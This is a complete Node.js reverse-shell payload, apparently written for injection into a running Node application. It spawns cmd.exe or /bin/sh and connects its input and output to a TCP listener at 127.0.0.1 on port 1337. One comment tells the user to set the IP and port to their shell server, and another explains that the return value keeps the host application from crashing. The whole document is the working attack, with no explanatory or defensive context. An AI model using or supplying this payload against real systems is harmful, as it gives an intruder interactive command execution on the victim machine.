(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn(process.platform === "win32"
            ? "C:\\Windows\\System32\\cmd.exe"
            : "/bin/sh", []);

    var client = new net.Socket();

    // Adjust IP and port to shell server
    client.connect(1337, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });

    // Prevents the Node.js application form crashing
    return 1;
})()